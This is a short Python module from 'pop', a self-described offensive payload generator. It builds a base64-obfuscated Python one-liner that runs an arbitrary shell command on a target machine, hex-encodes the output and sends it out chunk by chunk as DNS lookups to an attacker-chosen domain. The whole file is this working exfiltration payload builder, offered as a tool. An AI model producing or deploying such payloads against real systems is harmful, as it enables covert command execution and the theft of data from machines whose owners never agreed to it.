#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import base64


USAGE = 'domain cmd [arg...]'
NARGS = [2, 0]
LANG = 'sh'
EXEC = "python -c 'PAYLOAD'"

pl = ''


def g(s, args, _1, _2):
    cmd = ' '.join([a.replace('\\', '\\\\').replace('"', '\\"') for a in args[1:]])

    py = '''
import binascii,os,socket;o=binascii.hexlify(os.popen("CMD").read().encode()).decode()
for i in range(0,len(o),62):
 try:
  socket.gethostbyname("{}.{}.ARG1".format(i,o[i:i+62]))
 except:
  pass
    '''.replace('ARG1', args[0]).replace('CMD', cmd)

    return 'exec(__import__("base64").b64decode("{}").decode())'.format(base64.b64encode(py.encode()).decode())
